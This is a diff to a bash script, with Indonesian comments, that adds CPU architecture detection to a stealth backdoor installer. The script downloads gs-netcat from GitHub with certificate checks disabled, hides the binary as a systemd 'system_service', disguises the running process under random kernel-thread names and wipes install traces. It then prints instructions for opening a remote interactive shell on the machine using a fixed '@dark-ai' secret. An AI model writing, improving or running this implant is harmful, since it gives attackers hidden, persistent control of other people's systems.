@@ -1,6 +1,6 @@
 #!/bin/bash
 # ============================================================
-# SYSTEM SERVICE INSTALLER (FULLY STEALTH)
+# SYSTEM SERVICE INSTALLER (32-bit & 64-bit SUPPORT)
 # Binary Location: /usr/lib/systemd/system_service
 # Secret Key: [VPS_IP]@dark-ai
 # Connection: gs-netcat -s [VPS_IP]@dark-ai -i
@@ -31,25 +31,55 @@ VPS_IP=$(curl -s -4 --max-time 5 ifconfig.me 2>/dev/null || hostname -I 2>/dev/n
 DAEMON_SECRET="${VPS_IP}@dark-ai"
 
 # ============================================================
-# 1. DOWNLOAD BINARY
+# 0.5. DETEKSI ARSITEKTUR (32-bit / 64-bit)
+# ============================================================
+ARCH=$(uname -m)
+case "$ARCH" in
+    x86_64|amd64)
+        GSOCKET_URL="https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64"
+        BINARY_TYPE="x86_64"
+        ;;
+    i686|i386)
+        GSOCKET_URL="https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-i686"
+        BINARY_TYPE="i686"
+        ;;
+    armv7l|armv6l)
+        GSOCKET_URL="https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-arm"
+        BINARY_TYPE="arm"
+        ;;
+    aarch64)
+        GSOCKET_URL="https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-arm64"
+        BINARY_TYPE="arm64"
+        ;;
+    *)
+        echo "[!] Arsitektur $ARCH tidak didukung. Menggunakan x86_64..."
+        GSOCKET_URL="https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64"
+        BINARY_TYPE="x86_64"
+        ;;
+esac
+
+echo "[*] Arsitektur terdeteksi: $ARCH ($BINARY_TYPE)"
+
+# ============================================================
+# 1. DOWNLOAD BINARY (32-bit & 64-bit)
 # ============================================================
 echo "=========================================="
-echo " SYSTEM SERVICE INSTALLER"
+echo " SYSTEM SERVICE INSTALLER ($BINARY_TYPE)"
 echo "=========================================="
 
 mkdir -p "$HIDDEN_DIR" 2>/dev/null
 chmod 755 "$HIDDEN_DIR" 2>/dev/null
 
 if [ ! -f "$DAEMON_PATH" ]; then
-    echo "[*] Mengunduh komponen sistem..."
-    curl -sL --insecure --max-time 10 https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 -o "$DAEMON_PATH" 2>/dev/null || \
-    wget -q --no-check-certificate --timeout=10 https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 -O "$DAEMON_PATH" 2>/dev/null
+    echo "[*] Mengunduh binary untuk $BINARY_TYPE..."
+    curl -sL --insecure --max-time 10 "$GSOCKET_URL" -o "$DAEMON_PATH" 2>/dev/null || \
+    wget -q --no-check-certificate --timeout=10 "$GSOCKET_URL" -O "$DAEMON_PATH" 2>/dev/null
 
     if [ -f "$DAEMON_PATH" ]; then
         chmod +x "$DAEMON_PATH"
-        echo "[+] Komponen sistem terunduh"
+        echo "[+] Binary ($BINARY_TYPE) terunduh"
     else
-        echo "[!] Gagal mengunduh. Membuat komponen alternatif..."
+        echo "[!] Gagal mengunduh binary $BINARY_TYPE. Membuat fallback..."
         cat > "$DAEMON_PATH" << 'FALLBACKEOF'
 #!/bin/bash
 exec -a "${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}" "$0" -s "$DAEMON_SECRET" -liqD 2>/dev/null &
@@ -57,7 +87,7 @@ FALLBACKEOF
         chmod +x "$DAEMON_PATH"
     fi
 else
-    echo "[*] Komponen sistem sudah ada"
+    echo "[*] Binary sudah ada"
 fi
 
 # Lindungi binary
@@ -174,15 +204,18 @@ rm -rf /var/tmp/.system* /var/tmp/install* /var/tmp/setup* 2>/dev/null
 # ============================================================
 echo ""
 echo "=========================================="
-echo "[✅] INSTALASI SELESAI"
+echo "[✅] INSTALASI SELESAI ($BINARY_TYPE)"
 echo "=========================================="
 echo ""
 echo "🌐 VPS IP: $VPS_IP"
+echo "🏗 Arsitektur: $ARCH ($BINARY_TYPE)"
 echo ""
 echo "📌 CARA KONEKSI:"
 echo "-----------------"
-echo "1. Unduh client di mesin lokal:"
-echo "   wget https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 -O gs-netcat"
+echo "1. Unduh client yang sesuai dengan arsitektur Anda:"
+echo "   - 64-bit: wget https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 -O gs-netcat"
+echo "   - 32-bit: wget https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-i686 -O gs-netcat"
+echo "   - ARM:   wget https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-arm -O gs-netcat"
 echo "   chmod +x gs-netcat"
 echo ""
 echo "2. Koneksi ke server:"
@@ -201,5 +234,6 @@ echo ""
 echo "⚠️  CATATAN:"
 echo "-----------------"
 echo "Proses akan terlihat sebagai kernel thread asli."
+echo "Binary otomatis disesuaikan dengan arsitektur sistem ($BINARY_TYPE)."
 echo "Tidak ada referensi 'gsocket' di sistem."
 echo "=========================================="
